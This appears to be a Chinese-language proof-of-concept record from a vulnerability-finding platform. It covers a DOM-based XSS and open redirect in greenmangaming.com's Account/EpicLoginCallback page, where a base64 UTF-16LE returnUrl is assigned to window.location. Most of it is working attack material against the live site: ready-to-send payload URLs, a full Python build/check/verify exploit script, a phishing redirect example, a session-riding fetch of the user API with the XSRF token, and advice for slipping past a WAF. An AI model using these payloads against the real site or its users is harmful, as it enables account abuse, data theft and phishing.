# greenmangaming.com /Account/EpicLoginCallback returnUrl DOM 型 XSS（base64 UTF-16LE 解码后直赋 window.location，javascript: URI 同源执行，无 CSP）

- **code**: gmg-epic-login-callback-returnurl-dom-xss-base64-utf16le
- **kind**: poc
- **category**: frontend-reverse
- **component**: greenmangaming.com 主站（AngularJS Account 模块 / base64Service）
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=165（task#6，finding_checks.verdict=verified，findings.status=confirmed）。2026-11-11 约 21:00-21:20 UTC 在 ARTEX 执行机实测：① curl 取 https://www.greenmangaming.com/Account/EpicLoginCallback → HTTP 200 / 11112B，正文含 <div ng-controller="EpicLoginCallbackController"></div>，响应头无 Content-Security-Policy；② 从 main.js 还原 base64Service.decode = atob + Uint16Array 视图（即 base64(UTF-16LE)），按此构造 returnUrl（javascript: 伪协议 + document.title 打标）；③ 真实 headful Chromium 157.0.8103.38（Xvfb，平台记录代理，--ignore-certificate-errors）经 CDP 打开构造链接，1s 内 Runtime.evaluate 读到 document.title='ZZQEXEcontrol channel779_OK'，location.href 仍为该回调 URL —— 同源 JS 确已执行且页面未被导航替换；④ 对照实验：用普通 base64（非 UTF-16LE）编码同一 payload 时浏览器被导航到 /Account/<CJK 乱码>，反证解码语义确为 UTF-16LE 且 location 赋值生效。未在真实登录态下完成带凭据 /api/v2 请求演示（共享会话当时已失效），该升级路径按机理标注为待验证。
- **path**: pocs/gmg-epic-login-callback-returnurl-dom-xss-base64-utf16le/gmg_epic_login_callback_returnurl_poc.py
- **tags**: dom-xss, output-encoding, angularjs, base64-utf16le, javascript-uri, window-location, open-redirect, xsrf-token, session-riding, no-csp, greenmangaming, epiclogin, frontend-js-analysis
- **created_at**: 2026-11-11T21:10:20.457Z
- **engine**: https://www.greenmangaming.com/Account/EpicLoginCallback

## 描述

GMG 主站 Account 回调页的 AngularJS 控制器把 query 参数 returnUrl 交给 base64Service.decode（atob 后按 Uint16Array 视图解释 = base64(UTF-16LE)），结果直接赋给 $window.location，未做协议/来源校验，页面响应头无 CSP。因此 returnUrl=base64(UTF-16LE("javascript:...")) 会在 www.greenmangaming.com 同源执行任意 JS（可读非 HttpOnly 的 XSRF-TOKEN、以受害者会话调 /api/v2/*、篡改页面），同一参数传 base64(UTF-16LE("https://evil/")) 即为开放重定向。免登录、反射型，需受害者点击链接。

## 用法

```
前置：能访问 https://www.greenmangaming.com；目标页无 CSP（实测响应头确认）；returnUrl 必须是 base64(UTF-16LE(目标字符串)) 且做 URL 编码（'+' → %2B，页面会 decodeURIComponent 且把 '+' 变空格）。\n\n1) 服务端判据（三件套）：\n   python3 gmg_epic_login_callback_returnurl_poc.py check --host https://www.greenmangaming.com\n   期望：HTTP 200 / 11112B 左右、正文含 ng-controller="EpicLoginCallbackController"、无 Content-Security-Policy。\n   （手工等价：curl -sD hdr.txt -o cb.html 'https://www.greenmangaming.com/Account/EpicLoginCallback'; grep -o 'ng-controller="EpicLoginCallbackController"' cb.html; grep -i content-security-policy hdr.txt）\n\n2) 生成投递链接（离线）：\n   python3 gmg_epic_login_callback_returnurl_poc.py build --js "javascript:(function(){document.title='ZZQ_DOMXSS_OK'})()"\n   输出形如：.../Account/EpicLoginCallback?returnUrl=agBhAHYAYQBzAGMAcgBpAHAAdAA6ACgAZgB1AG4AYwB0AGkAbwBuACgAKQB7...%3D%3D\n\n3) 浏览器验证（判据是 title 被改写，不是看 HTML）：\n   python3 gmg_epic_login_callback_returnurl_poc.py verify --host https://www.greenmangaming.com\n   期望：title 出现 ZZQ_DOMXSS_OK，location.href 仍是回调 URL（说明在同源文档内执行，非导航）。\n\n4) 开放重定向对照：\n   python3 gmg_epic_login_callback_returnurl_poc.py build --target "https://example.org/phish"\n   浏览器打开后应 302/导航到 example.org（同一解码路径，不执行 JS）。\n\n5) 会话骑乘（机理，需真实登录态受害者）：\n   returnUrl=base64(UTF-16LE("javascript:fetch('/api/v2/user_info',{credentials:'include'}).then(r=>r.text()).then(t=>document.title='ZZQID:'+t)"))\n   XSRF-TOKEN cookie 非 HttpOnly，同源 JS 可读后以 X-XSRF-TOKEN 头完成写操作。\n\n常见失败原因：① base64 未按 UTF-16LE 编码 → 解码成乱码 → 变成导航到 /Account/<乱码>；② '+' 未编码成 %2B → 变空格 → atob 抛 InvalidCharacterError；③ 目标已加 CSP → javascript: URI 被拦；④ CDN/WAF 若看到明文 javascript: 可能直接 403 → payload 必须 base64 包装后再投递。
```

## 正文

```
# GMG /Account/EpicLoginCallback returnUrl DOM 型 XSS 复现手册

## 0. 结论与定位
- 入口：`https://www.greenmangaming.com/Account/EpicLoginCallback?returnUrl=<urlencoded base64(UTF-16LE)>`
- 类型：DOM-based output encoding validation（客户端输出编码/协议校验缺失）→ 同源任意 JS 执行；同一参数亦可开放重定向
- 免登录、反射型；需受害者打开链接（可直接投递/短链）
- 关键前提：目标页响应头**无 Content-Security-Policy**（实测确认），否则 `javascript:` URI 会被拦

## 1. 前端源码依据（main.js 原文）
```js
controller("EpicLoginCallbackController", ["$window", "Utils", "base64Service",
  function (e, t, n) {
    t = t.getQueryString(e.location.href);
    e.location = n.decode(t.returnUrl);      // <- 解码结果直接进 window.location，无协议/来源校验
  }]);
```
`base64Service.decode` = `atob(e)` 后建 `Uint16Array` 视图重新解释字节 ⇒ **语义等价 base64(UTF-16LE)**。
注意：`Utils.getQueryString` 对查询串做 `decodeURIComponent`，裸 `+` 会先被当成空格，导致 atob 报错 —— 因此 `+` 必须编码为 `%2B`。

## 2. 服务端三步判据（缺一不算命中）
```bash
curl -sD hdr.txt -o cb.html 'https://www.greenmangaming.com/Account/EpicLoginCallback'
head -1 hdr.txt                                   # 期望 HTTP/2 200
grep -o 'ng-controller="EpicLoginCallbackController"' cb.html   # 期望命中
grep -i 'content-security-policy' hdr.txt          # 期望为空（无 CSP）
```
实测基线：HTTP 200、content-length 11112、正文含
`<div ng-controller="EpicLoginCallbackController"></div>`、响应头无 CSP。

## 3. 构造 payload
```python
import base64, urllib.parse
js = "javascript:(function(){document.title='ZZQEXEcontrol channel779_OK'})()"
b64 = base64.b64encode(js.encode("utf-16-le")).decode()
url = "https://www.greenmangaming.com/Account/EpicLoginCallback?returnUrl=" + urllib.parse.quote(b64, safe="")
print(url)
```
实测使用的链接（逐字可复现）：
```
https://www.greenmangaming.com/Account/EpicLoginCallback?returnUrl=agBhAHYAYQBzAGMAcgBpAHAAdAA6ACgAZgB1AG4AYwB0AGkAbwBuACgAKQB7AGQAbwBjAHUAbQBlAG4AdAAuAHQAaQB0AGwAZQA9ACcAWgBaAFEARQBYAEUAQwBvAG4AdAByAG8AbAAgAGMAaABhAG4AbgBlAGwANwA3ADkAXwBPAEsAJwB9ACkAKAApAA%3D%3D
```

## 4. 浏览器验证（判据：title 被改写）
真实 headful Chromium 157.0.8103.38（Xvfb，经平台记录代理，`--ignore-certificate-errors`），通过 CDP `Runtime.evaluate` 轮询：
- 页面加载 1s 内 `document.title == 'ZZQEXEcontrol channel779_OK'`
- `location.href` 仍为上述回调 URL（**页面未被替换** ⇒ 是在同源文档内执行，而非导航）
- 结论：EXEC

**反证（证明解码语义）**：用普通 base64（非 UTF-16LE）编码同一 payload 时，浏览器被导航到 `/Account/<CJK 乱码>` 路径 —— 说明 `decode` 确为 UTF-16LE、`location` 赋值确实生效。

## 5. 影响升级（机理，如实边界）
- `XSRF-TOKEN` cookie 非 HttpOnly ⇒ 同源 JS 可读，再带 `X-XSRF-TOKEN` 头发 `/api/v2/*` 写请求
- 同源 `fetch(..., {credentials:'include'})` 可直接以受害者会话读用户信息
```js
javascript:(function(){fetch('/api/v2/user_info',{credentials:'include'})
  .then(r=>r.text()).then(t=>document.title='ZZQID:'+t)})()
```
- **边界**：本环境共享登录会话在验证后段已失效（curl user_info 返 401 IsReloginRequired），带凭据请求未在真实登录态下完成演示；仅 cookie 属性与同源能力已确认。升级步骤按机理标注，复现时需自备已登录会话。

## 6. 常见失败原因
1. base64 未按 UTF-16LE 编码（用 UTF-8/ASCII）→ 解码成乱码 → 表现为导航到 `/Account/<乱码>` 而非执行
2. `+` 未编码成 `%2B` → 变空格 → `atob` 抛 InvalidCharacterError，页面报错、无跳转
3. 目标已加 CSP（`script-src` 无 `unsafe-inline`/`unsafe-eval`）→ `javascript:` URI 被拦，需先复核响应头
4. 在跨域 iframe/新窗口上下文打开时，同源脚本能力不成立；必须让受害者在 `www.greenmangaming.com` 文档内直接打开
5. CDN/WAF 可能对 URL 中出现明文 `javascript:` 直接 403 → payload 必须 base64 包装后投递

## 7. 可执行脚本（离线生成 / 服务端检查 / 浏览器验证）
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GMG /Account/EpicLoginCallback returnUrl DOM 型 XSS 复现器

用法
----
# 1) 离线生成可投递链接（DOM XSS）
python3 gmg_epic_login_callback_returnurl_poc.py build \
    --js "javascript:(function(){document.title='ZZQ_DOMXSS_OK'})()"

# 2) 服务端三段检查：200 / ng-controller 标记 / 无 CSP
python3 gmg_epic_login_callback_returnurl_poc.py check --host https://www.greenmangaming.com

# 3) 真实浏览器（Playwright/Chromium）验证 title 是否被改写
python3 gmg_epic_login_callback_returnurl_poc.py verify --host https://www.greenmangaming.com

# 4) 开放重定向链接
python3 gmg_epic_login_callback_returnurl_poc.py build --target "https://example.org/phish"

# 走平台记录代理：--proxy http://127.0.0.1:PORT
"""
import argparse
import base64
import json
import sys
import urllib.parse

PATH = "/Account/EpicLoginCallback"
DEFAULT_HOST = "https://www.greenmangaming.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
MARKER = "ZZQ_DOMXSS_OK"


def b64_utf16le(s: str) -> str:
    """base64Service.decode 的逆运算：字符串 -> UTF-16LE -> base64。"""
    return base64.b64encode(s.encode("utf-16-le")).decode("ascii")


def build_url(host: str, raw: str) -> str:
    b64 = b64_utf16le(raw)
    # 关键：'+' 必须编码成 %2B。页面 getQueryString 做 decodeURIComponent，
    # 查询串里裸 '+' 会被当成空格 -> atob 抛 InvalidCharacterError。
    return f"{host.rstrip('/')}{PATH}?returnUrl={urllib.parse.quote(b64, safe='')}"


def http_check(host: str, proxy=None) -> bool:
    import requests

    url = f"{host.rstrip('/')}{PATH}"
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,*/*"})
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    r = s.get(url, timeout=30)
    body = r.text
    csp = r.headers.get("Content-Security-Policy")
    marker = 'ng-controller="EpicLoginCallbackController"'
    print(f"[*] GET {url} -> HTTP {r.status_code}, {len(r.content)} bytes")
    print(f"[*] ng-controller 标记: {'FOUND' if marker in body else 'MISSING'}")
    print(f"[*] Content-Security-Policy: {csp if csp else 'ABSENT'}")
    ok = r.status_code == 200 and marker in body and not csp
    print("[OK] 入口存在且无 CSP" if ok else "[FAIL] 入口判据不成立（见上）")
    return ok


def verify(host: str, js: str, marker: str, proxy=None) -> bool:
    from playwright.sync_api import sync_playwright

    url = build_url(host, js)
    print(f"[*] 投递 URL:\n{url}\n")
    with sync_playwright() as p:
        launch = {"headless": True, "args": ["--ignore-certificate-errors"]}
        if proxy:
            launch["proxy"] = {"server": proxy}
        b = p.chromium.launch(**launch)
        ctx = b.new_context(user_agent=UA, ignore_https_errors=True)
        pg = ctx.new_page()
        errs = []
        pg.on("pageerror", lambda e: errs.append(str(e)))
        pg.goto(url, wait_until="load", timeout=60000)
        title = ""
        for _ in range(30):  # 最多等 ~3s
            title = pg.title()
            if marker and marker in title:
                break
            pg.wait_for_timeout(100)
        href = pg.evaluate("location.href")
        print(json.dumps({"title": title, "href": href, "pageerrors": errs},
                         ensure_ascii=False, indent=2))
        ok = marker in title
        print("[OK] DOM XSS 成立：title 出现标记（同源 JS 已执行）" if ok
              else "[FAIL] 未执行：看 pageerrors；若 href 已变成 /Account/<乱码> 说明 base64 不是 UTF-16LE")
        b.close()
    return ok


def main() -> int:
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name in ("build", "check", "verify"):
        sp = sub.add_parser(name)
        sp.add_argument("--host", default=DEFAULT_HOST)
        sp.add_argument("--proxy", default=None)
        if name != "check":
            sp.add_argument("--js", default=f"javascript:(function(){{document.title='{MARKER}'}})()")
            sp.add_argument("--target", default=None, help="开放重定向目标 URL（与 --js 二选一）")
        if name == "verify":
            sp.add_argument("--marker", default=MARKER)
    a = ap.parse_args()

    if a.cmd == "build":
        raw = a.target if a.target else a.js
        print(build_url(a.host, raw))
        return 0
    if a.cmd == "check":
        return 0 if http_check(a.host, a.proxy) else 1
    raw = a.target if a.target else a.js
    return 0 if verify(a.host, raw, a.marker, a.proxy) else 1


if __name__ == "__main__":
    sys.exit(main())
```

## 8. 出处
ARTEX 平台 task#6 / intent 2779，2026-11-11 约 21:00–21:20 UTC；curl（平台记录代理）+ Xvfb headful Chromium 157.0.8103.38 经 CDP（Page/Runtime/Network/Fetch 域，`--ignore-certificate-errors`）实测。
```
